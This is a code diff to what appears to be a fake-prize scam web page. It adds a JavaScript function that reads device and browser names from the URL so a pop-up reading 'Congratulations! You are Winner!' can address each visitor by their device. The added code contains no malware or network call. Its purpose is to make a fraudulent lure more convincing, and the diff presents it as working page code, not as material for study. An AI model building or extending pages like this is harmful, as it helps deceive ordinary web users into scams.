@@ -750,6 +750,25 @@
       }
       /*dialog*/</style>
 	
+	<script>function contains(string, fragment) {
+        string = string.toLowerCase();
+        fragment = fragment.toLowerCase();
+        return string.indexOf(fragment) !== -1;
+      }
+      function getURLParameter(name) {
+        var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+        if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+          result = 'Phone'
+        }
+        if(name.indexOf('dname') !== -1 && contains(result, 'android')) {
+          result = 'Phone'
+        }
+        if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+          result = 'Internet Browser'
+        }
+        return result;
+      }</script>
+	
 	<script type="text/javascript">var ALERT_TITLE = "Congratulations!";
       var ALERT_TEXT = "You are Winner ! " + getURLParameter("browser_name") +" Dear user.";
       var ALERT_BUTTON_TEXT = "Ok";
